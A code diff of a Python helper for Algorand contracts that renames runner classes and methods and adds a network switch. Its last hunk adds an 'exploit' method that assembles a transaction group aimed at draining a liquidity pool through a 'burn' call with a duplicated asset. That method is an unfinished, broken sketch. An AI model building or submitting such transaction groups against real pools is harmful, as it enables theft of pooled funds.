@@ -12,13 +12,24 @@ from txn_manager import waitForTransaction
 
 
 
-class LocalRunnerAlgo:
-    def __init__(self):
-        token = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
-        url = "http://localhost:4001"
-        self.client = algod.AlgodClient(token, url)
+class AlgoRunner:
+    def __init__(self, net):
+        if net == 'local':
+            token = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+            url = "http://localhost:4001"
+            self.client = algod.AlgodClient(token, url)
+        elif net == 'test':
+            token = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+            url = "http://localhost:4001"
+            self.client = algod.AlgodClient(token, url)
+        elif net == 'main':
+            token = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+            url = "http://localhost:4001"
+            self.client = algod.AlgodClient(token, url)
+        else:
+            raise ValueError            
     # create a contract from the bucketGameProgram and send it
-    def local_create(self, acctNum):
+    def create(self, acctNum):
         creator_addr, creator_pk = get_accounts()[acctNum]
 
         path = os.path.dirname(os.path.abspath(__file__))
@@ -58,7 +69,7 @@ class LocalRunnerAlgo:
         return get_accounts()
     # send funds to the contract at appID
     # usually just used to initially fund the contract
-    def local_fund_contract(self, appID):
+    def fund_contract(self, appID):
         sender1, sender1_pk = get_accounts()[0]
         app_addr = get_application_address(appID)
         #print(app_addr)
@@ -73,7 +84,7 @@ class LocalRunnerAlgo:
         wait_for_confirmation(self.client, tx_id) 
         print("Funded at txn {}".format(tx_id))
 
-    def local_call(self, appID, acct, bet_size, side):
+    def call(self, appID, acct, bet_size, side):
         app_addr = get_application_address(appID)
         caller, caller_pk = get_accounts()[acct]
         args = [side]
@@ -110,7 +121,7 @@ class LocalRunnerAlgo:
         #info = client.application_info(appID)
         #print(info)
 
-    def local_optin(self, appID, acctNum):
+    def optin(self, appID, acctNum):
         sender, pk = get_accounts()[acctNum]
         txn = ApplicationOptInTxn(
             sender=sender,
@@ -122,7 +133,7 @@ class LocalRunnerAlgo:
         waitForTransaction(self.client, tx_id)
         print("Account {} opted in".format(sender))
 
-    def local_claim(self, appID, acctNum):
+    def claim(self, appID, acctNum):
         caller, pk = get_accounts()[acctNum]
         print("before claim {}".format(self.client.account_info(caller)["amount"]))
         claim_call = ApplicationCallTxn(
@@ -137,10 +148,10 @@ class LocalRunnerAlgo:
         print("after claim  {}".format(self.client.account_info(caller)["amount"]))
 
 
-    def local_closeout(self, appID, acctNum):
+    def closeout(self, appID, acctNum):
         pass
 
-    def local_delete(self, appID, acctNum):
+    def delete(self, appID, acctNum):
         caller, pk = get_accounts()[acctNum]
         delete_txn = ApplicationDeleteTxn(
             sender=caller,
@@ -152,14 +163,25 @@ class LocalRunnerAlgo:
         waitForTransaction(self.client, tx_id)
         print("Deleted {}".format(appID))
 
-class LocalRunnerAsa:
-    def __init__(self, asset):
-        token = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
-        url = "http://localhost:4001"
-        self.client = algod.AlgodClient(token, url)
+class AsaRunner:
+    def __init__(self, net, asset):
+        if net == 'local':
+            token = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+            url = "http://localhost:4001"
+            self.client = algod.AlgodClient(token, url)
+        elif net == 'test':
+            token = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+            url = "http://localhost:4001"
+            self.client = algod.AlgodClient(token, url)
+        elif net == 'main':
+            token = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+            url = "http://localhost:4001"
+            self.client = algod.AlgodClient(token, url)
+        else:
+            raise ValueError   
         self.assetID = asset
     # create a contract from the bucketGameProgram and send it
-    def local_create(self, acctNum):
+    def create(self, acctNum):
         creator_addr, creator_pk = get_accounts()[acctNum]
 
         path = os.path.dirname(os.path.abspath(__file__))
@@ -204,7 +226,7 @@ class LocalRunnerAsa:
         return get_accounts()
     # send funds to the contract at appID
     # usually just used to initially fund the contract
-    def local_fund_contract(self, appID):
+    def fund_contract(self, appID):
         sender1, sender1_pk = get_accounts()[0]
         app_addr = get_application_address(appID)
         #print(app_addr)
@@ -218,8 +240,9 @@ class LocalRunnerAsa:
         tx_id = self.client.send_transaction(stxn)
         wait_for_confirmation(self.client, tx_id) 
         print("Funded at txn {}".format(tx_id))
+        self.sc_asa_optin(appID)
 
-    def local_call(self, appID, acct, bet_size, side):
+    def call(self, appID, acct, bet_size, side):
         app_addr = get_application_address(appID)
         caller, caller_pk = get_accounts()[acct]
         args = [side]
@@ -258,7 +281,7 @@ class LocalRunnerAsa:
         #info = client.application_info(appID)
         #print(info)
 
-    def local_optin(self, appID, acctNum):
+    def optin(self, appID, acctNum):
         sender, pk = get_accounts()[acctNum]
         txn = ApplicationOptInTxn(
             sender=sender,
@@ -270,7 +293,7 @@ class LocalRunnerAsa:
         waitForTransaction(self.client, tx_id)
         print("Account {} opted in".format(sender))
 
-    def local_claim(self, appID, acctNum):
+    def claim(self, appID, acctNum):
         caller, pk = get_accounts()[acctNum]
         print("before claim {}".format(self.client.account_info(caller)))
         claim_call = ApplicationCallTxn(
@@ -279,6 +302,7 @@ class LocalRunnerAsa:
             foreign_assets=[self.assetID],
             on_complete=future.transaction.OnComplete.NoOpOC,
             sp=self.client.suggested_params(),
+            app_args=[0]
         )
         stxn = claim_call.sign(pk)
         tx_id = self.client.send_transaction(stxn)
@@ -286,10 +310,10 @@ class LocalRunnerAsa:
         print("after claim {}".format(self.client.account_info(caller)))
 
 
-    def local_closeout(self, appID, acctNum):
+    def closeout(self, appID, acctNum):
         pass
 
-    def local_delete(self, appID, acctNum):
+    def delete(self, appID, acctNum):
         caller, pk = get_accounts()[acctNum]
         delete_txn = ApplicationDeleteTxn(
             sender=caller,
@@ -301,7 +325,7 @@ class LocalRunnerAsa:
         waitForTransaction(self.client, tx_id)
         print("Deleted {}".format(appID))
 
-    def local_create_asa(self, acctNum):
+    def create_asa(self, acctNum):
         caller, pk = get_accounts()[acctNum]
         create_txn = AssetCreateTxn(
             sender=caller,
@@ -368,7 +392,7 @@ class LocalRunnerAsa:
         response = waitForTransaction(self.client, tx_id)
         print("Funded")
 
-    def local_sc_optin(self, appID):
+    def sc_asa_optin(self, appID):
         caller, pk = get_accounts()[1]
         claim_call = ApplicationCallTxn(
             sender=caller,
@@ -376,11 +400,11 @@ class LocalRunnerAsa:
             foreign_assets=[self.assetID],
             on_complete=future.transaction.OnComplete.NoOpOC,
             sp=self.client.suggested_params(),
-            app_args=[17],
         )
         stxn = claim_call.sign(pk)
         tx_id = self.client.send_transaction(stxn)
         waitForTransaction(self.client, tx_id)
+        print("sc opted in to asset")
 
     # eh this is probably useless. Will remake later to be useful
     # might not be as garbage as that asset creation and transfer
@@ -396,5 +420,44 @@ class LocalRunnerAsa:
         waitForTransaction(self.client, tx_id)
         print("deleted {}".format(appID))
 
+    def exploit(self):
+        sender, pk = "my_addr"
+        txn1 = PaymentTxn(
+            sender=sender,
+            sp=self.client.suggested_params(),
+            receiver="pool",
+            amt=3000,
+            note='fee'
+        )
+        txn2 = ApplicationCallTxn(
+            sender="pool",
+            sp=self.client.suggested_params(),
+            index=validator_app_id,
+            app_args=['burn'],
+            accounts=[sender],
+            foreign_assets=[asset1, asset1, liquidity_asset_id],
 
-
+        )
+        txn3 = AssetTransferTxn(
+            sender="pool",
+            sp=self.client.suggested_params(),
+            receiver=sender,
+            amt=asset1_amount,
+            index=asset1_id,
+        )
+        txn4 = AssetTransferTxn(
+            sender="pool",
+            sp=self.client.suggested_params(),
+            receiver=sender,
+            amt=asset2_amount,
+            index=asset2_id,
+        )
+        txn5 = AssetTransferTxn(
+            sender=sender,
+            sp=self.client.suggested_params(),
+            receiver="pool",
+            amt=liquidity_asset_amt,
+            index=liquidity_asset_id
+        )
+        group = [txn1, txn2, txn3, txn4, txn5]
+        
